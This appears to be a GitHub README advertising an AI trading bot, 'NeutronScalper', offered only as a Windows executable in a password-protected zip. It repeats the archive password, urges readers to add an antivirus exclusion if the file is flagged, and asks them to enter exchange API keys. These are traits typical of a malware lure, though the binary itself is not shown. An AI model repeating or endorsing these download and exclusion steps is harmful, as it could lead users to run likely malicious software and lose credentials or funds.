<div align="center"> <img width="2172" height="724" alt="image" src="https://github.com/user-attachments/assets/8bd8443e-90f3-4efe-be53-4be2bcc073cd" />

# neutron-ai-scalper
AI-powered scalping engine for crypto &amp; forex markets — adaptive neural signals, low-latency execution and institutional-grade risk controls. Windows build available on the official landing page.
<div align="center">

# ⚡ NeutronScalper

### AI-Powered Scalping Engine for Crypto & Forex Markets

**Adaptive neural signal generation · Sub-second execution · Institutional-grade risk controls**

[![Platform](https://img.shields.io/badge/platform-Windows%2010%2F11%20x64-0a84ff?style=flat-square&logo=windows)](https://neutronchimansion.github.io/neutron-ai-scalper/)
[![Engine](https://img.shields.io/badge/engine-Neutron%20Core%20v2.4-8b5cf6?style=flat-square)]()
[![Latency](https://img.shields.io/badge/execution-%3C45ms-22c55e?style=flat-square)]()
[![Markets](https://img.shields.io/badge/markets-Crypto%20%7C%20Forex%20%7C%20Indices-f59e0b?style=flat-square)]()
[![License](https://img.shields.io/badge/license-Proprietary-ef4444?style=flat-square)]()
[![Status](https://img.shields.io/badge/status-active%20development-06b6d4?style=flat-square)]()

[**⬇ Download**](https://neutronchimansion.github.io/neutron-ai-scalper/) · [**Security Policy**](SECURITY.md) · [**Landing Page**](https://neutronchimansion.github.io/neutron-ai-scalper/)

</div>

---

## 📌 Overview

**NeutronScalper** is a high-frequency, AI-driven trading engine built for traders who operate on the shortest timeframes — from **1-second tick scalping** to **5-minute momentum bursts**. Unlike conventional expert advisors that rely on static indicator crossovers, NeutronScalper fuses a **multi-layer neural inference stack** with a **microstructure-aware execution layer** to identify and act on transient inefficiencies in the order book.

The engine was designed around a single principle: *a scalper does not need to predict the future — it needs to react faster and more consistently than the crowd.* Every component, from the feature pipeline to the order router, is optimized for that goal.

The application ships as a native **Windows x64 executable** (`NeutronScalper.exe`) distributed inside a password-protected archive. No installation, no runtime dependencies, no Python environment required — download, extract, launch.

> ⚠️ **Trading involves substantial risk of loss.** NeutronScalper is a tool, not a guarantee. Read the [Disclaimer](#-disclaimer) before use.

---

## 🚀 Why NeutronScalper

Most retail scalping tools fail for the same three reasons: **lag**, **overfitting**, and **missing risk logic**. NeutronScalper addresses each one directly.

| Problem in retail scalping | Conventional tools | NeutronScalper approach |
|---|---|---|
| Signal lag | Indicator lag of 3–10 bars | Event-driven tick pipeline, no repainting |
| Overfitting | Hard-coded rules tuned to one regime | Regime-aware model switching (trend / range / shock) |
| Slippage blindness | Static take-profit / stop-loss | Dynamic TP/SL scaled to live spread & volatility |
| Execution jitter | Retail broker API round-trips | Coalesced order batching + smart retry ladder |
| No risk ceiling | Unbounded lot sizing | Hard equity guard, daily drawdown brake, exposure caps |
| Black-box behavior | No visibility | Live signal log, per-trade rationale, session telemetry |

---

## ✨ Feature Matrix

| Category | Feature | Description |
|---|---|---|
| **Signal Engine** | Multi-model inference | Three independently trained networks vote on each setup; disagreement above threshold suppresses the trade |
| | Regime classifier | Detects trending, ranging and shock regimes and routes to the matching sub-model |
| | Microstructure features | Order-book imbalance, trade-flow delta, spread velocity, queue pressure |
| | Repaint-free logic | Signals are finalized on candle close or tick event — no historical rewriting |
| **Execution** | Sub-45 ms target latency | Measured from signal finalization to order acknowledgment on a co-located VPS |
| | Smart order routing | Splits large entries into child orders to reduce market impact |
| | Retry ladder | Exponential backoff with spread re-check on rejection |
| | Slippage guard | Rejects fills beyond a configurable deviation from expected price |
| **Risk Management** | Equity guard | Hard stop of the engine at a user-defined equity floor |
| | Daily drawdown brake | Auto-pause after a configurable daily loss percentage |
| | Exposure caps | Per-symbol and portfolio-wide notional limits |
| | Correlation filter | Blocks simultaneous entries in highly correlated instruments |
| | Volatility throttle | Reduces position size automatically during spread spikes |
| **Analytics** | Live signal log | Every signal stored with features, confidence and outcome |
| | Session telemetry | Win rate, average hold time, expectancy, profit factor per session |
| | CSV / JSON export | Full trade and signal history for external analysis |
| | Equity curve viewer | Built-in chart with drawdown overlay |
| **Operations** | Preset profiles | Conservative / Balanced / Aggressive / Custom |
| | Dry-run mode | Full pipeline with simulated fills for validation |
| | Hot config reload | Change parameters without restarting the engine |
| | Crash-safe state | Open positions and session state persisted to disk |

---

## 🖥 System Requirements

| Component | Minimum | Recommended |
|---|---|---|
| OS | Windows 10 x64 (build 1909+) | Windows 11 x64 (23H2+) |
| CPU | 4 cores / 8 threads | 8 cores / 16 threads, 3.8 GHz+ |
| RAM | 8 GB | 16–32 GB |
| Disk | 500 MB free | 2 GB SSD free |
| Network | 20 Mbps stable | 100 Mbps, < 40 ms to exchange |
| Display | 1280×720 | 1920×1080 |
| Runtime | None (native binary) | None (native binary) |
| Privileges | Standard user | Standard user (admin not required) |

> **VPS note:** For serious scalping, run NeutronScalper on a VPS located in the same region as your broker/exchange matching engine. Latency dominates profitability at sub-minute horizons.

---

## 📦 Download & Installation

The official Windows build is distributed as a **password-protected archive**, hosted directly in this repository and mirrored on the official landing page.

| Item | Value |
|---|---|
| **Landing page** | `https://neutronchimansion.github.io/neutron-ai-scalper/` |
| **Archive** | `NeutronScalper-v2.4.1.zip` |
| **Archive location** | `downloads/NeutronScalper-v2.4.1.zip` |
| **Archive password** | `8025381933` |
| **Executable** | `NeutronScalper.exe` |
| **Platform** | Windows 10 / 11 x64 |

### Step-by-step

1. Open the **landing page** or navigate to the `downloads/` folder in this repository.
2. Download `NeutronScalper-v2.4.1.zip`.
3. Extract with **7-Zip**, **WinRAR** or **Windows Explorer** using the password `8025381933`.
4. Verify that `NeutronScalper.exe` is present in the extracted folder.
5. Run `NeutronScalper.exe` as a standard user (administrator rights are **not** required).
6. On first launch, load one of the bundled preset profiles and run **Dry-run mode** to validate connectivity.
7. Connect your broker/exchange API credentials in the *Connections* panel and switch to live mode when ready.

> 🔐 **Never** share your API keys. Use **read + trade** permissions only and disable **withdrawal** permissions on every exchange key you generate.

---

## 🗂 Archive Contents

| File / Folder | Purpose |
|---|---|
| `NeutronScalper.exe` | Main application binary |
| `config/default.yaml` | Default configuration profile |
| `config/presets/conservative.yaml` | Low-risk preset |
| `config/presets/balanced.yaml` | Balanced preset |
| `config/presets/aggressive.yaml` | High-frequency preset |
| `models/` | Neural inference weights (bundled) |
| `docs/QUICKSTART.pdf` | One-page quick start guide |
| `docs/PARAMETERS.md` | Full parameter reference |
| `logs/` | Runtime logs (created on first launch) |
| `checksums.txt` | SHA-256 checksums for every bundled file |

Verify integrity after extraction:

```powershell
Get-FileHash .\NeutronScalper.exe -Algorithm SHA256
```

Compare the output against the corresponding line in `checksums.txt`.

---

## ⚙️ Core Configuration

NeutronScalper is configured through `config/default.yaml`. The most important parameters are listed below.

| Parameter | Type | Default | Description |
|---|---|---|---|
| `engine.mode` | enum | `dry_run` | `dry_run` or `live` |
| `engine.symbols` | list | `["BTCUSDT","ETHUSDT"]` | Instruments to trade |
| `engine.timeframe` | enum | `1s` | `1s`, `5s`, `15s`, `1m`, `5m` |
| `signals.confidence_floor` | float | `0.62` | Minimum ensemble confidence to fire |
| `signals.disagreement_cap` | float | `0.25` | Max model disagreement before suppression |
| `signals.cooldown_ms` | int | `1500` | Minimum time between entries per symbol |
| `risk.max_daily_drawdown_pct` | float | `2.0` | Daily loss brake threshold |
| `risk.max_position_notional` | float | `5000` | Per-symbol notional cap (quote currency) |
| `risk.equity_floor_pct` | float | `85.0` | Hard engine stop at this equity level |
| `risk.volatility_throttle` | bool | `true` | Auto-reduce size during spread spikes |
| `execution.slippage_guard_bps` | int | `8` | Reject fills beyond this deviation |
| `execution.retry_max` | int | `3` | Max order retries before abort |
| `execution.order_split` | int | `2` | Child orders per parent entry |
| `telemetry.export_format` | enum | `csv` | `csv` or `json` |

All parameters are validated at startup; invalid values abort the launch with a clear error message.

---

## 🌍 Supported Markets

| Asset class | Examples | Typical spread | Recommended profile |
|---|---|---|---|
| Crypto perpetuals | BTCUSDT, ETHUSDT, SOLUSDT | 0.5–2 bps | Balanced / Aggressive |
| Crypto spot | BTCUSDT, ETHUSDT | 1–4 bps | Conservative / Balanced |
| Major FX | EURUSD, GBPUSD, USDJPY | 0.2–1.0 pip | Conservative |
| FX crosses | EURGBP, AUDNZD | 0.8–2.0 pip | Conservative |
| Indices (CFD) | US500, NAS100, GER40 | 0.3–1.5 pt | Balanced |
| Metals (CFD) | XAUUSD, XAGUSD | 1.5–4.0 pt | Balanced |

> Liquidity and spread conditions vary by broker and session. Always validate on a demo account before committing capital.

---

## 🧠 Signal Engine Architecture

| Layer | Function | Output |
|---|---|---|
| **Ingest** | WebSocket / FIX feed normalization | Tick + order-book snapshots |
| **Feature Store** | Rolling window computation (1s–5m) | 128-dimensional feature vector |
| **Regime Classifier** | Trend / range / shock detection | Regime label + confidence |
| **Ensemble** | 3 sub-models per regime | Direction + confidence per model |
| **Arbiter** | Weighted vote, disagreement check | Final signal or suppression |
| **Risk Gate** | Exposure, drawdown, correlation checks | Approved size or veto |
| **Router** | Order splitting, retry, slippage guard | Filled / rejected |
| **Telemetry** | Logging, metrics, persistence | Signal log + session stats |

Each layer is observable. In the *Signal Log* panel you can inspect the exact feature vector, the per-model votes and the arbiter decision for any historical signal.

---

## 📊 Performance Snapshot

> **Important:** The figures below are illustrative results from internal backtests and dry-run sessions on historical tick data. They are **not** a promise of future returns and do **not** account for all live-market frictions. Past performance is not indicative of future results.

| Profile | Timeframe | Trades / day | Avg hold | Win rate* | Profit factor* | Max drawdown* |
|---|---|---|---|---|---|---|
| Conservative | 15s | 20–40 | 45 s | 61% | 1.28 | 3.1% |
| Balanced | 5s | 60–110 | 22 s | 58% | 1.41 | 5.4% |
| Aggressive | 1s | 150–300 | 8 s | 54% | 1.36 | 9.7% |

\* Backtest / dry-run statistics. Live results depend on broker latency, spreads, fees and market regime.

---

## 🛡 Risk Management Philosophy

NeutronScalper treats risk management as a **first-class subsystem**, not an afterthought.

| Control | What it does | Why it matters |
|---|---|---|
| Equity floor | Stops the engine if equity drops below a set level | Prevents catastrophic account damage |
| Daily drawdown brake | Pauses trading after a daily loss threshold | Stops revenge-trading spirals |
| Notional caps | Limits position size per symbol and portfolio | Contains single-instrument blowups |
| Correlation filter | Blocks entries in highly correlated instruments | Avoids hidden concentrated exposure |
| Volatility throttle | Shrinks size when spread or ATR spikes | Adapts to deteriorating liquidity |
| Slippage guard | Rejects fills beyond tolerance | Prevents execution at toxic prices |
| Dry-run mode | Full simulation without capital at risk | Mandatory validation step before live |

**Recommended onboarding path:** `Dry-run 2 weeks` → `Conservative live, small size` → `Balanced` → `Aggressive only if metrics justify it`.

---

## ❓ FAQ

| Question | Answer |
|---|---|
| **What is the archive password?** | `8025381933` |
| **Is there an installer?** | No. Extract the archive and run `NeutronScalper.exe`. |
| **Does it need Python or Node.js?** | No. The binary is fully self-contained. |
| **Which brokers are supported?** | See the *Connections* panel after launch; the list is updated in-app. |
| **Can I run it on macOS or Linux?** | The official build targets Windows 10/11 x64. |
| **Does it work on a demo account?** | Yes — and demo/dry-run is strongly recommended before going live. |
| **Can I run multiple instances?** | Yes, but use separate config folders and separate API keys. |
| **Where are logs stored?** | In the `logs/` folder next to the executable. |
| **Why was my trade rejected?** | Check the Signal Log — rejection reason (slippage, risk gate, exposure cap) is recorded. |
| **Is my API key stored securely?** | Keys are encrypted at rest with a machine-bound key. See [SECURITY.md](SECURITY.md). |
| **How do I update?** | Download the newer archive from the landing page and extract over the previous folder, keeping `config/`. |
| **Does it phone home?** | Only anonymous telemetry (version, crash reports). Can be disabled in settings. |

---

## 🧩 Troubleshooting

| Symptom | Likely cause | Fix |
|---|---|---|
| Engine starts but no signals | Confidence floor too high | Lower `signals.confidence_floor` to `0.55` |
| Frequent order rejections | Slippage guard too tight | Increase `execution.slippage_guard_bps` to `12–15` |
| High CPU usage | Aggressive preset on weak hardware | Switch to Balanced, reduce symbol count |
| Connection drops | Unstable network / VPS | Move to a co-located VPS near the exchange |
| Equity guard triggered | Account drew below floor | Raise `risk.equity_floor_pct` and review sizing |
| Archive won't extract | Wrong password / corrupt download | Re-download and use password `8025381933` with 7-Zip |
| Antivirus flags the exe | Unsigned binary heuristic | Verify SHA-256 against `checksums.txt`, add exclusion if trusted |

---

## 🔐 Security

Please read [**SECURITY.md**](SECURITY.md) for:

- supported versions
- how to report a vulnerability privately
- API-key handling and encryption model
- archive integrity verification
- responsible disclosure timeline

**Never** post API keys, account numbers or trade logs containing personal data in GitHub Issues.

---

## 🗺 Upcoming

| Area | Planned improvement | Status |
|---|---|---|
| Execution | Additional venue adapters | In progress |
| Signals | Regime-aware confidence calibration | In progress |
| UX | Multi-monitor layout presets | Planned |
| Analytics | Rolling 30-day expectancy dashboard | Planned |
| Ops | Config diff viewer | Planned |
| Docs | Expanded parameter reference | Planned |

---

## 🔎 Keywords

`ai scalper` · `ai trading bot` · `algorithmic trading` · `scalping bot` · `crypto scalper` · `forex scalper` · `high frequency trading` · `hft bot` · `machine learning trading` · `deep learning trading` · `neural network trading` · `quantitative trading` · `order book trading` · `microstructure` · `low latency trading` · `risk management` · `backtesting` · `trading automation` · `windows trading bot` · `neutron scalper`

---

## ⚠️ Disclaimer

NeutronScalper is **software**, not financial advice. Trading leveraged instruments carries a high level of risk and can result in the loss of all invested capital. You are solely responsible for your trading decisions, configuration, broker selection and risk management. The authors and contributors accept **no liability** for any financial loss arising from the use of this software. Backtested and dry-run results do not guarantee future performance. Only trade with capital you can afford to lose.

---

## 📄 License

Proprietary. Redistribution of the binary or its components without written permission is prohibited. See the license notice bundled inside the archive.

<div align="center">

**NeutronScalper** — react faster, size smarter, survive longer.

[⬇ Download](https://neutronchimansion.github.io/neutron-ai-scalper/) · [🔐 Security](SECURITY.md)

</div>
